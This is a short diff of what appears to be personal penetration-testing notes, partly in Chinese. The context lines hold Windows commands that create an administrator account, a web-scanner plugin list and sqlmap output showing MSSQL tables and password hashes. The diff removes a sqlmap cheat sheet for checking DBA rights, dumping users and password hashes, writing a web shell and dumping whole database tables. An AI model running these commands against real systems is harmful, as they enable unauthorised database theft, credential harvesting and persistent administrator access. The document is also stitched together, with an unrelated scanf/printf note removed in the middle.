@@ -2,7 +2,6 @@ net user Test Test /add
 net localgroup administrators Test /add
 
 
-scanf 和 printf 的进阶使用！
 crawl find_backdoors web_spider phpinfo
 audit blind_sqli file_upload os_commanding sqli xss
 
@@ -430,22 +429,6 @@ Database: master
 | sys.xml_schema_wildcard_namespaces                |
 | sys.xml_schema_wildcards                          |
 +---------------------------------------------------+
-
-python sqlmap.py -u 注入地址 --is-dba   判断当前用户是不是DBA
-python sqlmap.py -u 注入地址 --users    查看当前用户
-python sqlmap.py -u 注入地址 --passwords 查看密码
-python sqlmap.py -u 注入地址 --privileges 查看权限
-python sqlmap.py -u 注入地址 --os-shell  写web shell
-
---dbs
-爆库
--D 库 --tables
-爆表
--D 库 -T 表 --columns
-爆字段
--D 库 -T 表 -C 字段 --dump
-脱裤
--D 库 -T 表 -C 字段 --dump --threads=10 --start=1 --stop=10
 
 database management system users password hashes:
 [*] ##MS_PolicyEventProcessingLogin## [1]:
